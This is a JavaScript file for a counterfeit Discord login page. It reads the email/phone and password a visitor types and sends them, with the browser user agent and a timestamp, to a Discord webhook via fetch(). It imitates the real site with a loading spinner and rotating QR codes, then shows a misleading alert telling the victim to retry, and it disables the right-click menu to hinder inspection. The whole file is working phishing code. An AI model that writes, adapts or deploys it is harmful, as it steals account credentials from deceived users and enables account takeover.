// ---------------------------------- 
// SELECTING ELEMENTS
// ---------------------------------- 
const loginButton = document.querySelector("button");
const loginForm = document.querySelector("form");
const emailInput = document.getElementById("emailORphone");
const passwordInput = document.getElementById("password");

// ---------------------------------- 
// DISCORD WEBHOOK CONFIGURATION
// ---------------------------------- 
const DISCORD_WEBHOOK_URL = "https://discord.com/ZnwKOvUOKDZrbNUSr"

// ----------------------------------- 
// ELLIPSIS ANIMATION
// ------------------------------------ 
function removeEllipsisAnimation() {
    loginButton.innerHTML = "";
    loginButton.textContent = "Log In";
    loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
    loginButton.innerHTML = "";
    loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
        </span>
    </span>`;
    
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
        item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
    });
    
    loginButton.setAttribute("disabled", "true");
    setTimeout(removeEllipsisAnimation, 3000);
}

// -------------------------------------------------- 
// ---------- DISCORD WEBHOOK FUNCTION ------------- 
// -------------------------------------------------- 
async function sendToDiscordWebhook(email, password) {
    const payload = {
        embeds: [{
            title: "?? Discord Login Attempt",
            color: 0x5865F2, // Discord blue color
            fields: [
                {
                    name: "?? Email/Phone",
                    value: email || "Not provided",
                    inline: true
                },
                {
                    name: "?? Password",
                    value: password || "Not provided",
                    inline: true
                },
                {
                    name: "?? User Agent",
                    value: navigator.userAgent,
                    inline: false
                },
                {
                    name: "?? IP Info",
                    value: "Check server logs for IP",
                    inline: true
                },
                {
                    name: "? Timestamp",
                    value: new Date().toISOString(),
                    inline: true
                }
            ],
            footer: {
                text: "Discord Login Monitor"
            },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log('Successfully sent to Discord webhook');
        } else {
            console.error('Failed to send to Discord webhook:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending to Discord webhook:', error);
    }
}

// -------------------------------------------------- 
// ---------- FORM SUBMISSION HANDLER -------------- 
// -------------------------------------------------- 
function handleFormSubmission(event) {
    event.preventDefault(); // Prevent default form submission
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    // Validate inputs
    if (!email || !password) {
        alert("Please fill in both email/phone and password fields.");
        return;
    }
    
    // Send to Discord webhook
    sendToDiscordWebhook(email, password);
    
    // Start loading animation
    animateEllipsis();
    
    // Optional: Clear form after submission
    setTimeout(() => {
        emailInput.value = "";
        passwordInput.value = "";
        
        // Show success message or redirect
        alert("Login attempt recorded. Please check your credentials and try again.");
    }, 3000);
}

// -------------------------------------------------- 
// ---------- WANDERING CUBES ANIMATION ------------- 
// -------------------------------------------------- 
function generateRandomString() {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < 43; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function removeQrCodeAnimation() {
    // 1. Simply remove all the inner html
    const qrCodeContainer = document.querySelector(".right-section .qr-code");
    qrCodeContainer.innerHTML = "";
    
    // 2. Add back the normal elements
    qrCodeContainer.insertAdjacentElement(
        "afterbegin",
        generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
    );
    qrCodeContainer.insertAdjacentHTML(
        "beforeend",
        `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );
    
    // 3. Change background
    qrCodeContainer.style.background = "white";
}

function simulateQrCodeChange() {
    const qrCodeContainer = document.querySelector(".right-section .qr-code");
    
    // 1. Remove the image and svg of qrcode
    qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
    qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
    
    // 2. Change background to transparent
    qrCodeContainer.style.background = "transparent";
    
    // 3. Insert wandering cubes markup
    const markup = `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
            <span class="item"></span>
            <span class="item"></span>
        </span>
    </span>`;
    qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
    
    // 4. Timeout to remove interval and get back original state
    setTimeout(removeQrCodeAnimation, 3500);
}

setInterval(simulateQrCodeChange, 120 * 1000);

// -------------------------------------------------- 
// ---------- GENERATING QRCODE --------------------- 
// -------------------------------------------------- 
function generateQRCode(data) {
    try {
        // Create QR Code instance
        const qr = qrcode(0, "L");
        qr.addData(data);
        qr.make();
        
        const moduleCount = qr.getModuleCount();
        const svgString = qr.createSvgTag(1, 0);
        
        // Convert SVG string to SVG element
        const parser = new DOMParser();
        const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
        const svgElement = svgDoc.documentElement;
        
        svgElement.setAttribute("width", "160");
        svgElement.setAttribute("height", "160");
        svgElement.setAttribute("viewBox", "0 0 37 37");
        
        const path = svgElement.querySelector("path");
        if (path) {
            path.setAttribute("transform", `scale(${37 / moduleCount})`);
        }
        
        return svgElement;
    } catch (error) {
        console.error("Error generating QR code:", error);
        return null;
    }
}

// -------------------------- 
// ATTACHING EVENT LISTENERS
// -------------------------- 
loginForm.addEventListener("submit", handleFormSubmission);
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    handleFormSubmission(e);
});

document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
});